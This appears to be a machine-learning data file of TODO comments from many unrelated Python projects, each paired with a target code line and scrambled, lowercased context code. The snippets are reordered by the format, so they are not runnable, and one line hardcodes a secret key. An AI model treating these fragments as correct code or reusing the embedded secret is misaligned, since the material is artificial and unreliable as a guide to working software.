# todo: replicate complete behaviour of urllib.urlopener.retrieve </s> return self.tuf_open( tuf_updater, data = data )	open else:
# todo add verbose output </s> self._localedir = new_localedir	localedir @localedir.setter def localedir(self, new_localedir):
# todo/fixme: combine and refactor all these rotation transformations </s> ndim = len(self._distribution.shape)	rotate if subset is not None: raise NotImplementedError() if inv is not None: invR = inv
# todo: check success summary the same way. </s> expected = """	test_summary_wrong_reason_with_enum Summary classes should verify failure reason passed to the `failed_because` method. 'failed_because' method got argument mismatching failure protocol: "'foo' is too big" Available failures are: <Errors.foo: 1>, <Errors.bar: 2>, <Errors.baz: 3>
# todo: all constant stuff should be calculated once, make this a class or something </s> namespace = (defaults or {}).copy()	format_item except ImportError, exc: raise error.UserError("To be able to use Tempita templates, (easy_)install the 'tempita' package (%s)" % exc) namespace.update((name[4:], method if item else lambda x, m=method: str(x).rjust(len(str(m(0))))) for name, method in globals().items()
return rc  # todo?: parse </s> self.pin.send(events)	sbsSetChallenges events = [self.pin.event('page_view', 'Hub - SBC')]
pass # todo: raise exception here </s> else:	add_signal self.__signals[signal] = []
# todo better way to test this? </s> count = 0	test_no_auto_start_request count += 1 self.assertEqual(0, count) for _ in range(100):
# todo (@awaelchli): standardize this across all plugins in lightning and lite. related refactor: #7324 </s> return model	_setup_model def _setup_model(self, model: Module) -> Module:
# todo(phawkins): enable test after jaxlib 0.1.22 is released. </s> self._compileandcheck(lax_fun, args_maker, check_dtypes=true)	testUniformLogPdf self._CheckAgainstNumpy(scipy_fun, lax_fun, args_maker, check_dtypes=True)
# todo: we need to pick the rank from `comm_shm`, not `comm`, </s> objcomm = none	initialize @_initialize.register(EntryFunction) def _(iet): for i in iet.parameters: if isinstance(i, MPICommObject):
# todo: move upstream </s> def log_prob(self, value):	log_prob if self._validate_args: self._validate_sample(value)
# todo: hack by genie for temporary markdown support </s> async def _parse_message_e2e(self, text: text, line_num: int) -> useruttered:	MarkdownStoryReader ) return utterance from rasa.nlu.training_data.formats.markdown import MarkdownReader message_processed = MarkdownReader().parse_training_example(text)
# todo: a better way. loot at https://github.com/openmined/pysyft/issues/5249 </s> parent.__dict__[typ.__name__] = typ	wrap_type type_proto2object=proto2object, )
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
# todo handle valueerror </s> if type != none:	sharedproperty value = self.extra_props[name] del self.extra_props[name] value = type(value) self.__dict__[name] = value
# todo(hartikainen): make this consistent such that there's no need </s> evaluation_env._env.log_diagnostics(paths)	_evaluate logger.record_tabular('episode-length-std', np.std(episode_lengths)) if hasattr(evaluation_env._env, 'log_diagnostics'): env_infos = evaluation_env.get_path_infos(paths) for key, value in env_infos.items():
# todo: add explicit close of file_system. </s> return file_system_searcher.filesystemsearcher(file_system, mount_point)	_GetSourceFileSystemSearcher else: mount_point = self._source_path_spec.parent
# todo for windows: </s> try:	handler def handler(signal_received, frame): kill_cmd = "screen -r -S %s -X quit" % screen_name subprocess.check_call(kill_cmd, shell=True) except:
# update cache todo: should this be in the txn? </s> for service in self.cache.services:	unregister_app_service token, ) if service.token == token: service.url = None
# todo this dosn't work yet </s> e = indexerror(5).with_traceback(tb)	testWithTraceback e = BaseException().with_traceback(tb) self.assertIsInstance(e, BaseException) self.assertIsInstance(e, IndexError) class MyException(Exception):
# todo: move this hard-coded mixin/manager injections to maybe a model </s> if self.dataset.slug == "socios-brasil" and self.name == "empresa":	get_model mixins = [DatasetTableModelMixin] meta = {"ordering": ordering, "indexes": indexes, "db_table": db_table} mixins.insert(0, data_models.SociosBrasilEmpresaMixin) managers["objects"] = data_models.SociosBrasilEmpresaQuerySet.as_manager()
# todo, awni, get rid of this on next pytorch update </s> hx = autograd.variable(torch.zeros(x.shape[0], x.shape[2]), requires_grad=false).cuda()	decode inputs = self.embedding(y[:, :-1]) out = []; aligns = [] ax = None; sx = None; for t in range(y.size()[1] - 1):
# todo(john sirois): clean this up when build parse refactoring is tackled. </s> unused_resolved_binary = self.binary	JvmApp return super(JvmApp, self).dependencies def resolve(self): unused_resolved_bundles = self.bundles for resolved in super(JvmApp, self).resolve():
# todo: errors </s> return	rest_post_response break if self.CSRFtoken == None: self.rest_post(command, data, callback, error_callback, callback_data) return
# todo(henry-nash): add implementation here. </s> pass	contract_schema could have been left inconsistent while running with a mix of releases, then this should be fixed up here.
elif not self.urls and not self.packages:  #@todo: remove in 0.4.10 </s> self.fail("no link grabbed")	decrypt if self.links: self.packages = [(self.info['name'], self.links, self.info['folder'])]
# todo(jblespiau): we can simply use buf.xla_shape() when version 0.1.58 is </s> self.assertequal(	ShardedJitTest self.assertAllClose(actual, expected, check_dtypes=False) self.assertLen(actual.device_buffers, 2) getattr(actual.device_buffers[0], "xla_shape", actual.device_buffers[0].shape)().dimensions(), (4, 8))
os.rename(checkpoint_handler._saved[-1][1][-1], os.path.join(tb_logger.writer.log_dir, weights_name))  # todo: pr in ignite to have better access to saved file paths (cleaner) </s> tb_logger.close()	train trainer.run(train_loader, max_epochs=args.n_epochs) if args.local_rank in [-1, 0] and args.n_epochs > 0:
#todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	COPY else: try: request = urllib2.Request(url) request.add_header('X-Plex-Token', users[userfrom]['accessToken'])
# todo: move to data class </s> return checklist	get_data checklist = data["checklist"]
# todo: enable once pyyaml requirement resolved with python 3.8 </s> return new_object	copy new_object._set_new_id()
srcs = [sourcelayer(n_out=n_in, x_out=x_in, name='')] #todo </s> params = { 'sources': srcs, 'n_out': info[1], 'activation': info[2][1], 'dropout': drop, 'name': info[3], 'mask': self.mask }	initialize del LstmLayer.sharpgates for info, drop in zip(self.hidden_info, dropout[:-1]): name = params['name'] if info[0] == 'forward':
# todo we could potentially check at the unit level and only reject </s> raise valueerror(_("file %r was rejected because its x-pootle-revision is too old.") % (file.name))	import_file store, created = Store.objects.get_or_create(pootle_path=pootle_path) if rev < store.get_max_unit_revision(): except Exception as e: raise ValueError(_("Could not create %r. Missing Project/Language? (%s)") % (file.name, e))
# todo(b/134950354): test embedding column for non-eager mode only for now. </s> if tf.executing_eagerly():	testEmbeddingFeatureColumnInput def testEmbeddingFeatureColumnInput(self): self.skipTest('b/134950354') key = 'feature_key'
# todo: fix client side code to send us time information then adapt the next line </s> date_format = self.form_item.data['date_format'].split(' ')[0]	DateField def save_data(self, registration, value): if value: value = datetime.strptime(value, date_format).isoformat() return super(DateField, self).save_data(registration, value)
raise deprecatedtest # this test is now broken. todo: fix it. </s> ap = make_test_ap()	test_simple_view_request def test_simple_view_request(): req = normalize_request({'id': None, 'name': None}, {'id':3, 'name':'stuff'})
# todo: not for checkbox (should have checkbox class) </s> result.add('form-group')	css_classes else: result = set() return ' '.join(result)
# todo: handle fancy-index copies by allocating a buffer and </s> rval.append(self.data[source.index(so)][indexes])	get source = (source,) for so in source: return tuple(rval)
# todo: remove when botfactory can force everything to be unthreaded </s> time.sleep(0.1)	test_isup_command_ok irc.pm(user, '.isup example.com') while bot.running_triggers: assert len(bot.backend.message_sent) == 1, ( '.isup command should output exactly one line')
# todo: check nd reply is valid </s> self.asserttrue(self.packet_outs_from_flows(nd_replies))	test_nd_for_controller 'ipv6_dst': str(ip_gw_mcast), 'neighbor_solicit_ip': str(dst_ip)})
#todo factorisation with accessor code ? </s> fmt_char = pysparse.gltf.fmt_char_dict[pysparse.json['indices']['componenttype']]	read pysparse.indices_buffer = BufferView(pysparse.json['indices']['bufferView'], pysparse.gltf.json['bufferViews'][pysparse.json['indices']['bufferView']], pysparse.gltf) pysparse.indices_buffer.read() component_size = struct.calcsize(fmt_char) component_nb = pysparse.gltf.component_nb_dict['SCALAR']
#todo: check y.lod_level = 0 dtype </s> else:	lod_append if isinstance(level, Variable): inputs['Y'] = level attrs['target_lod'] = level helper.append_op(
# todo: find out how to get global usernames </s> def unblock(mastodon, rest):	unblock @command
# todo check for other files </s> if not config_file:	clear_mirrors def clear_mirrors(self, config_file): config_file = '/etc/faucet/faucet.yaml' try:
# todo remove this assertion and test </s> assert x.shape[1] == 2	quasi_newton_update_diagonal_blocks incorporates the diagonal blocks, too. X = mesh.node_coords diagonal_blocks = numpy.zeros((X.shape[0], 2, 2)) diagonal_blocks[:, 0, 0] += 2 * mesh.control_volumes
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
assert study_id == 0  # todo </s> self.trials[trial_id].result = result	report_result def report_result(self, study_id, trial_id, result):
#todo: it should be a way to use relative path for platform independent. </s> conffile = str(qtcore.qdir.homepath()) + '/.config/wordforge/pootling.conf'	lookupProcess @param units: a unit or list of units if (not hasattr(self, "matcher")): self.pickleTMObj = pickleTM(confFile) self.matcher = self.pickleTMObj.getMatcher()
# todo: use new schema from caso_full when its ready </s> return {	country_row deaths = state_totals["total_deaths"] population = state_totals["total_population"] "city": "Brasil", "city_ibge_code": 0,
#convert regex to python format: todo use a common routine for this </s> replace = re.sub('\$(\d+)', r'\\\1', replace)   #map $1 to \1 etc.   #todo: also need to escape any existing \1 etc.	pipe_regex match = util.get_value(rule['match'], kwargs) #todo use subkey? replace = util.get_value(rule['replace'], kwargs) #todo use subkey? rules.append((rule['field']['value'], match, replace)) for item in _INPUT:
# todo: really dirty. figure out a better way. </s> location_movements = [x for x in location_movements if x.identifier not in all_set]	_query_and_populate_exchange_asset_movements only_cache=only_cache, ) else: assert isinstance(exchange, Location), 'only a location should make it here'
raise exceptions.mpdnotimplemented  # todo </s> ``playlistmove {name} {from_songpos} {to_songpos}``.	playlistmove documentation, but just the ``SONGPOS`` to move *from*, i.e.
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo: verify behavior </s> self.assert_received(self.debugger, [])	test_new ])
# todo: how does this work with backfilling? </s> if hasattr(event, "replaces_state"):	_store_event_txn "state_key": event.state_key, } vals["prev_state"] = event.replaces_state state_values.append(vals)
# todo: 289 </s> policyauthor.__init__(self, *args, **kwargs)	Alice Character.__init__(self, *args, **kwargs) if kwargs.get('is_me') and not federated_only: self.federated_only = federated_only def generate_kfrags(self, bob, label, m, n) -> List:
# todo(mnaser): remove this in patch resolving the issue </s> self.assertin(volume_id, self.cinder.attachments[server_id])	test_delete_with_reserved_volumes_new self.api.delete_server(server['id'])
# todo: jrk: chunking times points needs to be simplified </s> parallel, p_time_gen, n_jobs = parallel_func(_fit_slices, n_jobs)	_GeneralizationAcrossTime if 'slices' not in self.train_times_: self.train_times_ = _sliding_window(epochs.times, self.train_times) n_chunks = min(len(self.train_times_['slices']), n_jobs) splits = np.array_split(self.train_times_['slices'], n_chunks)
# todo replace hardcoded integers into constants/flags from cffi </s> if major_value == 851968 and minor_value == 2529639107:	validate_gss_status raise GSSInternalError('Failed to get GSS minor display status for last API call') minor_status_str = _gss_buffer_to_str(status_str_buf) raise CredentialsCacheNotFound( minor_status_str
#todo: implement more realistic closing semantics </s> pass	close close a socket. Currently a no-op on this MockSocket object.
# todo: nix unittest for pytest </s> for exception in (typeerror("onoz"), unsupportedalgorithm("oops")):	test_load_rsa_transmutes_crypto_exceptions def test_load_rsa_transmutes_crypto_exceptions(self): with patch( "paramiko.rsakey.serialization.load_der_private_key"
# todo: use a contextmanager to ensure we always delete the callback from the list. </s> del self.ping_callbacks[remote]	wait_ping except asyncio.futures.TimeoutError: logger.debug('timed out waiting for ping from {}'.format(remote)) return got_ping
# todo: clean this up. shouldn't we move the "checks" stuff to the </s> if cmk_base.checks.check_info:	_perform_post_config_loading_actions initialize_config_caches() initialize_service_levels() add_wato_static_checks_to_checks() initialize_check_caches()
# todo: enable this check when #1502 is fixed </s> assert 'href="/group/group_00?page=1' in res	test_group_read res = self.app.get(url_for(controller='group', action='read', id='group_00', page=2))
# todo: fix this, is it needed? </s> data = await reader.read(size)	RDP data += await tlsObj.read_tls(read_len) else: return data async def send_data(self, writer, data, tlsObj=None):
# todo fitness? </s> return list(np.flip(gs, axis=0)) # most recent	rank_gs def rank_gs(self, gs):
# todo: check if a success http code can be returned with an empty body </s> return subscription	subscription_delete raise endpoints.NotFoundException("Card not found.") subscription.key.delete()
# todo: add for morph targets data. </s> old_to_new_indices = {}	extract_primitive_pack process_bone = False bone_max = bone_index new_to_old_indices = {} new_index = 0
# todo(hirofumi): apply character lm here </s> else:	BeamSearchDecoder if c == last_token: new_p_nb = p_b + p_t new_p_nb = np.logaddexp(p_b + p_t, p_nb + p_t) if c == self.space:
# todo: move load and cpuload to sysinfo </s> if load1m > 2:	set_turbo print("Current load:", load1m) print("-" * 25) print("High load, turbo: ON") s.run("echo 0 > /sys/devices/system/cpu/intel_pstate/no_turbo", shell=True)
except (testtransactionfailed, validationerror, valueerror):  # todo: 1950 </s> work = 0	remaining_work try: work = self.worklock_agent.get_remaining_work(checksum_address=self.checksum_address) return work
# todo: large gains also expected when precalculating psi. </s> psi = segment_axis(y, k, 1, axis=-1)[:, :t - delay - k + 1, ::-1]	get_correlations_narrow_v5 def get_correlations_narrow_v5(Y, inverse_power, K, delay): D, T = Y.shape Psi_conj_norm = inverse_power[None, delay + K - 1:, None] * Psi.conj() correlation_matrix = np.einsum('dtk,etl->kdle', Psi_conj_norm, Psi)
# todo don't use exceptions to control program flow </s> @_template_renderer('projectbuilds.html')	projectbuilds def projectbuilds(request, pid): prj = Project.objects.get(id = pid)
#todo: actually optimize free space on the texture. </s> player_id = 1	draw_frames_merged def draw_frames_merged(self, color_table):
from vyper.old_codegen.expr import expr  # todo rethink this circular import </s> pos = getpos(stmt_expr)	lll_for_external_call def lll_for_external_call(stmt_expr, context): value, gas = get_gas_and_value(stmt_expr, context) args_lll = [Expr(x, context).lll_node for x in stmt_expr.args]
# todo: figure out a solution that doesn't require hoping that </s> self.transport.config['url'] = 'http://localhost:9999/'	test_send_sms_noconn @inlineCallbacks def test_send_sms_noconn(self): msg = self.make_outbound("hello") d = self.dispatch(msg)
# todo find out what's wrong </s> warnings.warn(	__init__ ] elif index == 'X': 'Stroud-Secrest\'s scheme X for E_3^r has degree 3, not 7.' )
# todo: exit codes (not only for this, but for other exceptions) </s> if action == 'run':	ursula emitter.echo(str(e), color='red', bold=True) click.get_current_context().exit(1) try:
# todo: use different flag than .reentrant </s> pos_array = [colorsorter._transform_point(a(pos)) for pos in pos_array]	schedule_polycone appropriate. if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: if drawing_globals.use_c_renderer and ColorSorter.sorting: if len(color) == 3:
# todo: move error code and field outside function </s> raise validationerror(	validate_storefront_url domain, _ = split_domain_port(parsed_url.netloc) except ValueError as error: {"redirectUrl": str(error)}, code=AccountErrorCode.INVALID )
# todo: deprecated - remove in version 0.10 </s> if isinstance(training_trackers, string_types):	train "Pass appropriate featurizer " "directly to the policy instead.") logger.warning("Passing a file name to `agent.train(...)` is " "deprecated. Rather load the data with "
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: error handling like numba callwrappers.py </s> native_val = unbox_array(types.array(dtype=dtype, ndim=1, layout='c'), arr_obj, c)	lower_unbox_df_column arr_obj = c.pyapi.object_getattr_string(args[0], "values") dtype = sig.args[2].dtype return native_val.value
#todo need gutter of scrollbar - how do we get that? </s> if event.button == 1:	on_diffmap_button_press_event def on_diffmap_button_press_event(self, area, event): size_of_arrow = 14 diffmapindex = self.diffmap.index(area)
# todo: add test here as well </s> assert chatcommands.isblu("4622463 stackoverflow", original_msg=msg) == \	test_blacklisted_users assert chatcommands.addblu("4622463 stackoverflow", original_msg=msg) == \ "User blacklisted (`4622463` on `stackoverflow.com`)." "User is blacklisted (`4622463` on `stackoverflow.com`)." assert chatcommands.rmblu("4622463 stackoverflow", original_msg=msg) == \
raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
# todo: type ignored -- breaks liskov substitution. </s> sys.stderr.write(err)	_disable_output_capturing_for_darwin sys.stdout.write(out)
# todo: remove when botfactory can force everything to be unthreaded </s> time.sleep(0.1)	test_isupinsecure_command irc.pm(user, '.isupinsecure https://example.com') while bot.running_triggers: assert len(bot.backend.message_sent) == 1, ( '.isupinsecure command should output exactly one line')
# todo: marker </s> self.toprow = row((self.mceditbutton, self.viewdistancedown, label("view distance:"),	loadLevel self.netherButton.selectedChoice = [d[0] for d in dimensionsMenu if d[1] == str(self.level.dimNo)][0] self.remove(self.topRow) self.viewDistanceReadout, self.viewDistanceUp, self.viewButton, self.viewportButton, self.recordUndoButton, self.netherButton,
if source_file:  # todo: should we error here or something if the source_file doesn't exist? </s> try:	generate the content of the result, ready for saving. source_file = self.source_file fp = source_file.storage.open(source_file.name) except IOError:
# todo remove comment parameter. </s> if isinstance(constraint, bool):	Z3Solver return declarations def add(self, constraint, comment=None): if not constraint: self._status = 'unsat'
self.info          = {}  #@todo: remove in 0.4.10 </s> self.last_notify   = 0	setup def setup(self): self.notifications = 0
# todo: log modification too? </s> before = str(to_edit_span)	_create_span assert False, error_msg else: to_edit_span.start = int(start) to_edit_span.end = int(end)
# todo: maybe change this later to push some more info, not just the </s> message = socket.inet_aton(self.config.get("global", "clientip"))	do_hello def do_hello(self): self.send(common.CONTROL_CHANNEL_BYTE, common.CONTROL_INIT+message, None)
# todo(pradeep): try not to use the function of a member object. may be expose </s> input_sentence_indices = self.nn_solver.data_indexer.pad_indices(input_sentence_indices,	get_nearest_neighbors input_sentence_ids.append(sentence_id) input_sentence_indices.append(sentence_indices[0]) self.max_sentence_length) encoded_input_sentences = self.encoder_model.predict(numpy.asarray(input_sentence_indices))
# todo: this logic does not prevent duplicate test cases, need to address this in the future. </s> if len(data) > self.max_udp:	send self._sock.send(data) elif self.proto == socket.SOCK_DGRAM: self.logger.debug("Too much data for UDP, truncating to %d bytes" % self.max_udp) data = data[:self.max_udp]
# todo (aron): add i18n by varying the language of the topic tree here </s> topictree = get_flat_topic_tree()	_add_full_title_from_topic_tree @classmethod def _add_full_title_from_topic_tree(cls, entry): video_title_dict = cls._construct_video_dict() entry_kind = entry['entity_kind']
# todo: abstract and require implementation? </s> return self.files.new_key(jobstoreid)	_newKey def _newKey(self, jobStoreID):
self.asserttrue(greps(out, "zzc.service.pid")) # todo ? </s> time.sleep(1)	test_4105_systemctl_py_kill_in_stop self.assertEqual(end, 0) self.assertFalse(greps(out, "zzb.service.pid")) # issue #13 top_recent = "ps -eo etime,pid,ppid,args --sort etime,pid | grep '^ *0[0123]:[^ :]* '" top = output(top_recent.format(**locals()))
# todo(shardy): may be able to remove when the bug above is fixed </s> nova = client.client(username=con.username,	authenticate if con.password is not None: try: api_key=con.password, project_id=con.tenant,
# todo: exception for coalesces that represents all sub_specs tried </s> raise coalesceerror('no valid values found while coalescing')	glom ret = spec.default else: elif isinstance(spec, Literal): ret = spec.value
self._cloud_flow_complete_message.addaction("", i18n_catalog.i18nc("@action", "review your connection"), "", "", 1) # todo: icon </s> self._start_cloud_flow_message.actiontriggered.connect(self._onreviewcloudconnection)	_onCloudPrintingConfigured i18n_catalog.i18nc("@info:status", "Connected!") # image caption ) self._cloud_flow_complete_message.show() active_machine = self._application.getMachineManager().activeMachine
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_float def test_fail_depth_float(self): ``depth`` is a float.
# todo: separate the service from the node model </s> def __init__(self, qrlnode: qrlnode):	__init__ self.qrlnode = qrlnode
# todo simplify </s> print('training random_forest_regression')	random_forest_regression def random_forest_regression(self): trained_model = self._dsm.random_forest_regressor(trees=200, scoring_metric='roc_auc', randomized_search=True) self.print_metrics(trained_model)
# todo: keep the parser around, so we don't have to </s> while value:	_parse event = buffer[0] value = event.message byte = value & 0xff value = value >> 8
# todo hacky console hacky-ness </s> if 'value' in pcmap[pc]:	_select_bind pcMap = self.root.pcMap note = self.root.main.note self.root.main.console.configure(state="normal") self.root.main.console.insert(1.0, " {0[op]} {0[value]}".format(pcMap[pc]))
# todo: handle this in the ui </s> import traceback	_layoutEngineOTLTablesRepresentationFactory ret[name] = value except: print(traceback.format_exc(5)) return ret, glyphOrder
# todo: serialize the policy </s> return response('policy created!', status=200)	create_policy new_policy = drone_alice.create_policy(bob, label, m, n, federated=federated_only)
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = 'unable to parse the following line(s):<br/>{}'.format(	enrich_json_with_data ) if ann_obj.failed_lines: '\n<br/>\n'.join( ['{}: {}'.format(
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_inputs_empty def test_fail_inputs_empty(self): ``inputs`` is an array, but it is empty.
# todo make fetch_result _not_ a pd.dataframe </s> fetch_result = processresult(pd.dataframe({'a': [], 'b': []}))	test_first_row_is_header_zero_rows def test_first_row_is_header_zero_rows(self): result, error = scrapetable.render(pd.DataFrame(), P(first_row_is_header=True),
# todo it may be interesting to get a random bucket among the acquirable </s> return cheapest_buckets[0]	_pick_bucket min_cost = min(buckets_by_cost.keys()) cheapest_buckets = buckets_by_cost[min_cost]
# todo: support format.binary once it is supported in </s> if format not in self._supported_formats:	extract def extract(self, format, carrier): raise opentracing.UnsupportedFormatException def get_as_list(dict_object, key):
# todo(leofang): test float16 ('e') once cupy/cupy#5346 is resolved </s> @testing.for_dtypes('iilqfd')	test_shfl_down @unittest.skipIf(runtime.is_hip, 'HIP is not yet supported') def test_shfl_down(self, dtype): N = 5
# todo use the json output option to ceph so we can stop scraping </s> if output:	_check_osd_up_and_in def _check_osd_up_and_in(self, output): try: _, total, osd_up, osd_in = [x.split()[0] for x in output.replace(',', ':').split(':')]
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	_update_group if not activity.has_key('id'): assert False, "activity object has no id value" assert False, "activity has no revision_id value" timestamp = datetime_from_string(activity['timestamp'])
# todo: only works for ratios </s> res.metadata['reference_kpi'][dk['name']] = re.sub('('+'|'.join(self.kpi_names)+')/', '', dk['formula'])	delta kpis_to_analyse.update([dk['name']]) self.kpis.loc[:,dk['name']] = eval(re.sub('('+'|'.join(self.kpi_names)+')', r'self.kpis.\1.astype(float)', dk['formula'])) if kpi_subset is not None: kpis_to_analyse.intersection_update(kpi_subset)
# todo: make this config driven </s> metadata = {}	rpm_package_metadata def rpm_package_metadata(package): result = rpm_query('%{Name},%{Version},%{Release}', package) if result.success:
# todo: figure out a better way of handling rpc style calls. </s> if action == 'interrupt':	post def post(self, kernel_id, action): self.application.interrupt_kernel(kernel_id) if action == 'restart':
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	disabled if self._values['state'] == 'disabled': return True return True elif self._values['disabled'] in BOOLEANS_FALSE:
# todo: this is a temporal fix </s> lbp_descriptor = windowiteratorresult(	lbp print(iterator) lbp_descriptor = iterator.LBP(radius, samples, mapping_type, verbose) np.ascontiguousarray(np.rollaxis(lbp_descriptor.pixels, -1)), lbp_descriptor.centres)
# todo: distinguish between urllib and urllib2 contracts </s> def retrieve(	Updater ) return response self, url,
node.test = gast.call(gast.attribute( # todo any over dim 0 </s> node.test, gast.name('any', gast.load(), none), none), [], [])	visit_If self.generic_visit(child) self.execution_mask_stack.pop()
# todo: identify the specific structure we're finding and document this a bit better </s> address = context.object("unsigned long long", offset = result - 6 - 8,	determine_valid_kernels min_address = kernels[0]['mz_offset']) for result in results: layer_name = physical_layer_name) try:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_get_inclusion_states def test_get_inclusion_states(self): Fetching inclusion states with transactions.
# todo log this </s> pass	_get_search_index raise e except widx.IndexError as e: except widx.IndexVersionError as e:  # (msg, version, release=None) pass
kind = 'article'  # todo: recognise pages </s> yield (post.get('title'), post.get('body_cleaned'), slug, date,	posterous2fields date_object -= delta date = date_object.strftime("%Y-%m-%d %H:%M") post.get('user').get('display_name'), [], tags, kind, "html")
# todo: when merging forward to 0.56.x.x, arnold lights use </s> if isinstance( node, gafferarnold.arnoldshader ) :	__nodeMetadata def __nodeMetadata( node, name ) : key = node["name"].getValue() elif isinstance( node, GafferArnold.ArnoldLight ):
# todo: warn the user if mode of ensemble </s> if self.selector is none:	predict_proba def predict_proba(self, X): out = self.ensemble.output(X, mode='probs') return np.mean(out, axis=2)
# todo: the following reproduces the old behavior of </s> i.clear()	_transformBlock for i in block.component_objects(Integral, descend_into=True): i.parent_block().reclassify_component_type(i, Expression) i._constructed = False i.construct()
# todo we could reload the message </s> pass	Forward await self.get_input_sender()) except ValueError: return self._sender @property
# todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	GETVIEWSTATE unwatchedXML = XML.ElementFromURL(fetchUrl) else: request = urllib2.Request(fetchUrl) request.add_header(
# todo(b/151468119): remove this branch after next release. </s> if getattr(model_spec_pb2, 'inferenceendpoint', false):	_run_model_inference tag=model_spec.tag, signature_name=model_spec.model_signature_name) inference_endpoint = getattr(model_spec_pb2, 'InferenceEndpoint')() else:
# todo: fill this in </s> raise validationerror	_add_steps if not isinstance(Steps, list):
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo (t65593688): this should be removed after </s> with torch.no_grad():	test_tokens_dictfeat_contextual def test_tokens_dictfeat_contextual(self): model = Seq2SeqModel.from_config( Seq2SeqModel.Config(
# todo cachew for all commits? </s> return list(sorted(res.values(), key=lambda c: c.dt))	get_all_commits res[c.sha] = min(nn, c, key=lambda c: c.sha)
# todo: fetch that from the api with paraminfo </s> self.special_names = set(['deleteglobalaccount', 'patrol', 'rollback',	TokenWallet self.site = site self.site._tokens = {} 'setglobalaccountstatus', 'userrights', 'watch'])
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	get_ajax_console def get_ajax_console(self, instance):
aiplayer.load_abstract_buildings(self.session.db) # todo: find a better place for this </s> for player in self.players:	_init self.pirate.load_ship_states(savegame_db) if any(isinstance(player, AIPlayer) for player in self.players): if not isinstance(player, HumanPlayer): player.finish_loading(savegame_db)
#todo(#212): use a map construct instead of unrolling. </s> source = batching.move_dim_to_front(source, s_bdims)	select_and_scatter_add_batch_rule return outputs, 0 elif s_bdims is not None: outputs = [ _select_and_scatter_add(s, operand, **kwargs) for s in source]
# todo: handle dbkeys </s> params = util.params( inputs, sanitize = false )	create inputs[k] = v inputs['runtool_btn'] = 'Execute' template, vars = tool.handle_input( trans, params.__dict__, history=target_history ) if 'errors' in vars:
# todo move interpretation of data into column config </s> r[sub_col.ui_alias] = row[sub_col.es_alias]['doc_count']	_get_aggregated_results if report_column.type == 'expanded': for sub_col in get_expanded_column_config(self.config, report_column, 'en').columns: elif report_column.field == self.aggregation_columns[0]: r[report_column.column_id] = row['key']
# todo replace with collections.sequence subclass </s> spotify.error.maybe_raise(self.error)	artists def artists(self): Will always return :class:`None` if the track isn't loaded. if not self.is_loaded: return None
# todo delete me </s> import yaml	parseSDFInertial list(inertia), key=lambda el: el.tag)] inertial_dict['name'] = 'inertial_' + link.attrib['name'] print(yaml.dump(inertial_dict)) return inertial_dict
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': false,	get_properties 'handles_numerical_features': True, 'prefers_data_scaled': False, 'handles_multiclass': True, 'handles_multilabel': False,
#todo(chris): implement service_catalog </s> self.service_catalog = none	_v2_auth ["nova"][0]["publicURL"] self.auth_token = body["auth"]["token"]["id"]
# todo(ylc/zhifengc): add this to a policy module and test it. </s> def _perhostinfeedtpuordinalfunction(use_per_core_infeed, task_id,	_PerHostInfeedTPUOrdinalFunction shard_index_in_host): tpu_ordinal = -1
# todo: check if output is spent </s> o.spent = none	gettransaction input_total += i.value for o in t.outputs: output_total += o.value t.hash = tx_id
# todo note this is inefficient since we are running the raw dataframe through the pipeline twice. </s> results = self.make_factors(dataframe, number_top_features=number_top_features)	make_predictions_with_k_factors Returns: pandas.core.frame.DataFrame: predictions_list = self.make_predictions(dataframe) results[self.prediction_column] = predictions_list
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_GET_InvalidData try: self.assertEqual(self.rnw.GET(url, data), 'json') self.assertEquals(e, TypeError)
# todo: find better ways... </s> bucket_size = (len(connections) // 2) + 1	save_connections def save_connections(connections, dir=u'.'): offset = 0 for i in range(1, 3):
# todo: set the following parameter </s> config[setting_name('social_auth_disconnect_pipeline')] = (	_parse_config config[setting_name('DISCONNECT_REDIRECT_URL')] = () 'social_core.backends.google_openidconnect.GoogleOpenIdConnect', 'social_core.backends.instagram.InstagramOAuth2'
# todo: this isn't a true unit test.  it depends on the test cmakelists.txt file having been written correctly. </s> generator = platform.get_best_generator()	test_cxx_compiler def test_cxx_compiler(): platform.write_test_cmakelist(["CXX", "C"]) assert(generator is not None)
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
duration_s = none  # todo </s> recording_software_name = none  # todo	recording_update_pupil_mobile_to_pprf_2_0 start_time_system_s = None  # TODO start_time_synced_s = None  # TODO recording_software_version = None  # TODO recording_name = None  # TODO
# todo: document! </s> return map(qobj, array(u * s).reshape((d, d, dk)).transpose((2, 0, 1)))	_svd_u_to_kraus def _svd_u_to_kraus(U, S, d, dK):
